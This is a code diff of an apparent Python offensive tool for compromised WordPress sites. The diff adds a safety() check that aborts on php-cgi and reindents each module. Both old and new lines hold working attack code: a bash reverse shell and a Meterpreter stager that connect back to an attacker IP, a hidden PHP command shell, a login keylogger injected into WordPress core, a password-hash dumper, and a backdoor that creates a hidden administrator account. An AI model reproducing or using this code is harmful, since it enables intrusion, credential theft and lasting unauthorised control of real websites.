@@ -148,14 +148,15 @@ def credextract(list, key):
 
 
 def shell(host,uploaddir):
-    ip = raw_input('IP Address: ')
-    port = raw_input('Port: ')
-    params = [('cmd', ('php -r \'$sock=fsockopen("' + ip + '",' + port + ');exec("/bin/bash -i <&3 >&3 2>&3");\'').encode('base64'))]
-    try:
-        print "Sending reverse shell to " + ip + " port " + port
-        requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params, timeout=1)
-    except requests.exceptions.Timeout:
-        pass
+    if safety(host, uploaddir):
+        ip = raw_input('IP Address: ')
+        port = raw_input('Port: ')
+        params = [('cmd', ('php -r \'$sock=fsockopen("' + ip + '",' + port + ');exec("/bin/bash -i <&3 >&3 2>&3");\'').encode('base64'))]
+        try:
+            print "Sending reverse shell to " + ip + " port " + port
+            requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params, timeout=1)
+        except requests.exceptions.Timeout:
+            pass
 
 
 def keylog(host,uploaddir):
@@ -165,31 +166,32 @@ def keylog(host,uploaddir):
 
 
 def stealth(host,uploaddir):
-    hidden_shell = '''<?php
-$command = $_GET["cmd"];
-$command = substr($command, 0, -1);
-$command = base64_decode($command);
+    if safety(host, uploaddir):
+        hidden_shell = '''<?php
+    $command = $_GET["cmd"];
+    $command = substr($command, 0, -1);
+    $command = base64_decode($command);
 
-if (class_exists('ReflectionFunction')) {
-   $function = new ReflectionFunction('system');
-   $thingy = $function->invoke($command );
+    if (class_exists('ReflectionFunction')) {
+       $function = new ReflectionFunction('system');
+       $thingy = $function->invoke($command );
 
-} elseif (function_exists('call_user_func_array')) {
-   call_user_func_array('system', array($command));
+    } elseif (function_exists('call_user_func_array')) {
+       call_user_func_array('system', array($command));
 
-} elseif (function_exists('call_user_func')) {
-   call_user_func('system', $command);
+    } elseif (function_exists('call_user_func')) {
+       call_user_func('system', $command);
 
-} else {
-   system($command);
-}
+    } else {
+       system($command);
+    }
 
-?>
-'''
-    payload = hidden_shell.encode('base64')
-    params = [
-        ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > shell.php').encode('base64'))]
-    requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+    ?>
+    '''
+        payload = hidden_shell.encode('base64')
+        params = [
+            ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > shell.php').encode('base64'))]
+        requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
 
 
 def warning():
@@ -201,101 +203,103 @@ def warning():
 
 
 def meterpreter(host,uploaddir):
-    ip = raw_input('IP Address: ')
-    port = raw_input('Port: ')
-    meter = '''<?php
-error_reporting(0);
-$ip   = '%s';
-$port = %s;
-if (($f = 'stream_socket_client') && is_callable($f)) {
-    $s      = $f("tcp://{$ip}:{$port}");
-    $s_type = 'stream';
-} elseif (($f = 'fsockopen') && is_callable($f)) {
-    $s      = $f($ip, $port);
-    $s_type = 'stream';
-} elseif (($f = 'socket_create') && is_callable($f)) {
-    $s   = $f(AF_INET, SOCK_STREAM, SOL_TCP);
-    $res = @socket_connect($s, $ip, $port);
-    if (!$res) {
-        die();
+    if safety(host, uploaddir):
+        ip = raw_input('IP Address: ')
+        port = raw_input('Port: ')
+        meter = '''<?php
+    error_reporting(0);
+    $ip   = '%s';
+    $port = %s;
+    if (($f = 'stream_socket_client') && is_callable($f)) {
+        $s      = $f("tcp://{$ip}:{$port}");
+        $s_type = 'stream';
+    } elseif (($f = 'fsockopen') && is_callable($f)) {
+        $s      = $f($ip, $port);
+        $s_type = 'stream';
+    } elseif (($f = 'socket_create') && is_callable($f)) {
+        $s   = $f(AF_INET, SOCK_STREAM, SOL_TCP);
+        $res = @socket_connect($s, $ip, $port);
+        if (!$res) {
+            die();
+        }
+        $s_type = 'socket';
+    } else {
+        die('no socket funcs');
     }
-    $s_type = 'socket';
-} else {
-    die('no socket funcs');
-}
-if (!$s) {
-    die('no socket');
-}
-switch ($s_type) {
-    case 'stream':
-        $len = fread($s, 4);
-        break;
-    case 'socket':
-        $len = socket_read($s, 4);
-        break;
-}
-if (!$len) {
-    die();
-}
-$a   = unpack("Nlen", $len);
-$len = $a['len'];
-$b   = '';
-while (strlen($b) < $len) {
+    if (!$s) {
+        die('no socket');
+    }
     switch ($s_type) {
         case 'stream':
-            $b .= fread($s, $len - strlen($b));
+            $len = fread($s, 4);
             break;
         case 'socket':
-            $b .= socket_read($s, $len - strlen($b));
+            $len = socket_read($s, 4);
             break;
     }
-}
-$GLOBALS['msgsock']      = $s;
-$GLOBALS['msgsock_type'] = $s_type;
-eval($b);
-die();
-?>
-''' % (ip, port)
-    payload = meter.encode('base64')
-    params = [
-        ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > meterpreter.php').encode('base64'))]
-    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-    params = [
-        ('cmd', 'php meterpreter.php'.encode('base64'))]
-    try:
-        print "Sending meterpreter stager to connect back to " + ip + ":" + port
-        sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params, timeout=1)
-    except requests.exceptions.Timeout:
-        pass
-    print sendcommand.text
+    if (!$len) {
+        die();
+    }
+    $a   = unpack("Nlen", $len);
+    $len = $a['len'];
+    $b   = '';
+    while (strlen($b) < $len) {
+        switch ($s_type) {
+            case 'stream':
+                $b .= fread($s, $len - strlen($b));
+                break;
+            case 'socket':
+                $b .= socket_read($s, $len - strlen($b));
+                break;
+        }
+    }
+    $GLOBALS['msgsock']      = $s;
+    $GLOBALS['msgsock_type'] = $s_type;
+    eval($b);
+    die();
+    ?>
+    ''' % (ip, port)
+        payload = meter.encode('base64')
+        params = [
+            ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > meterpreter.php').encode('base64'))]
+        sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+        params = [
+            ('cmd', 'php meterpreter.php'.encode('base64'))]
+        try:
+            print "Sending meterpreter stager to connect back to " + ip + ":" + port
+            sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params, timeout=1)
+        except requests.exceptions.Timeout:
+            pass
+        print sendcommand.text
 
 
 def keylogger(host,uploaddir):
-    if warning():
-        hook = '''$credentials['remember'] = false;
-         $file = 'wp-content/plugins/%s/passwords.txt';
-         $credz = date('Y-m-d') . " - Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'] . "\n";
-         file_put_contents($file, $credz, FILE_APPEND | LOCK_EX);''' % (uploaddir)
+    if safety(host, uploaddir):
+        if warning():
+            hook = '''$credentials['remember'] = false;
+             $file = 'wp-content/plugins/%s/passwords.txt';
+             $credz = date('Y-m-d') . " - Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'] . "\n";
+             file_put_contents($file, $credz, FILE_APPEND | LOCK_EX);''' % (uploaddir)
 
-        hook = hook.encode('base64')
-        injector = '''<?php
-    $real = "JGNyZWRlbnRpYWxzWydyZW1lbWJlciddID0gZmFsc2U7";
-    $evil = "%s";
-    $real = base64_decode($real);
-    $evil = base64_decode($evil);
+            hook = hook.encode('base64')
+            injector = '''<?php
+        $real = "JGNyZWRlbnRpYWxzWydyZW1lbWJlciddID0gZmFsc2U7";
+        $evil = "%s";
+        $real = base64_decode($real);
+        $evil = base64_decode($evil);
 
-    $orig=file_get_contents('../../../wp-includes/user.php');
-    $orig=str_replace("$real", "$evil",$orig);
-    file_put_contents('../../../wp-includes/user.php', $orig);
-    ?>''' % hook
-        payload = injector.encode('base64')
-        params = [
-            ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > backdoor.php').encode('base64'))]
-        requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-        params = [
-            ('cmd', 'php backdoor.php'.encode('base64'))]
-        requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-        print "wp_signon function patched.  Do not run this more than once.  Use 'keylog' to check the log file."
+        $orig=file_get_contents('../../../wp-includes/user.php');
+        $orig=str_replace("$real", "$evil",$orig);
+        file_put_contents('../../../wp-includes/user.php', $orig);
+        ?>''' % hook
+            payload = injector.encode('base64')
+            params = [
+                ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > backdoor.php').encode('base64'))]
+            requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+            params = [
+                ('cmd', 'php backdoor.php'.encode('base64'))]
+            requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+            print "wp_signon function patched.  Do not run this more than once.  Use 'keylog' to check the log file."
 
 
 def hashdump(host,uploaddir):
@@ -327,14 +331,14 @@ if ($result->num_rows > 0) {
 $conn->close();
 ?> ''' % (items[0], items[1], items[2], items[3])
     payload = dumper.encode('base64')
-
-    params = [
-    ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > hashdump.php').encode('base64'))]
-    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-    params = [
-    ('cmd', 'php hashdump.php'.encode('base64'))]
-    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-    print sendcommand.text
+    if safety(host, uploaddir):
+        params = [
+        ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > hashdump.php').encode('base64'))]
+        sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+        params = [
+        ('cmd', 'php hashdump.php'.encode('base64'))]
+        sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+        print sendcommand.text
 
 
 def beefhook(host,uploaddir):
@@ -346,29 +350,42 @@ def beefhook(host,uploaddir):
         print "BeEF hook added!  Check BeEF for any hooked clients. Do not run this multiple times."
 
 def persist(host,uploaddir):
-    username = raw_input('Username: ')
-    email = raw_input('Email: ')
-    password = raw_input('Password: ')
-    evilcode = '''
-    $new_user = '%s';
-    $new_user_email = '%s';
-    $new_user_password = '%s';
+    if safety(host, uploaddir):
+        username = raw_input('Username: ')
+        email = raw_input('Email: ')
+        password = raw_input('Password: ')
+        evilcode = '''
+        $new_user = '%s';
+        $new_user_email = '%s';
+        $new_user_password = '%s';
 
-if(!username_exists($new_user_email)) {
-  $user_id = wp_create_user($new_user, $new_user_password, $new_user_email);
+    if(!username_exists($new_user_email)) {
+      $user_id = wp_create_user($new_user, $new_user_password, $new_user_email);
 
-  wp_update_user(array('ID' => $user_id, 'nickname' => $new_user, 'user_email' => $new_user_email));
-}
-  $user = new WP_User($user_id);
-  $user->set_role('administrator');
-''' % (username, email, password)
-    payload = evilcode.encode('base64')
-    if warning():
-        params = [
-            ('cmd',('php -r \'echo base64_decode("' + payload + '");\' >> ../../../wp-blog-header.php').encode('base64'))]
-        sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-        print "Added persistent user \"%s\" with the password \"%s\"." % (username, password)
+      wp_update_user(array('ID' => $user_id, 'nickname' => $new_user, 'user_email' => $new_user_email));
+    }
+      $user = new WP_User($user_id);
+      $user->set_role('administrator');
+    ''' % (username, email, password)
+        payload = evilcode.encode('base64')
+        if warning():
+            params = [
+                ('cmd',('php -r \'echo base64_decode("' + payload + '");\' >> ../../../wp-blog-header.php').encode('base64'))]
+            sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+            print "Added persistent user \"%s\" with the password \"%s\"." % (username, password)
 
+
+def safety(host,uploaddir):
+    params = [('cmd', ('which php').encode('base64'))] #Checks which PHP
+    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+    results = sendcommand.text
+    params = [('cmd', ('readlink -e ' + results).encode('base64'))] # resolves Symlinks
+    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+    if "php-cgi" in sendcommand.text: #issues with php-cgi.  Aborts the module.
+        print "The PHP interpreter on this system is not compatible with this module."
+        return False
+    else:
+        return True
 
 
 def printbanner():
@@ -403,7 +420,7 @@ def main():
     parser.add_argument('-t','--target',help='URL of target', required=True)
     parser.add_argument('-u','--username',help='Admin username', required=False)
     parser.add_argument('-p','--password',help='Admin password', required=False)
-    parser.add_argument('-a', '--agent', help='Custom User Agent', required=False, default='Yertle backdoor uploader')
+    parser.add_argument('-a', '--agent', help='Custom User Agent', required=False, default='Yertle uploader')
     parser.add_argument('-li','--ip',help='Listener IP', required=False)
     parser.add_argument('-lp','--port',help='Listener Port', required=False)
     parser.add_argument('-v','--verbose',help=' Verbose output.', required=False, action='store_true')
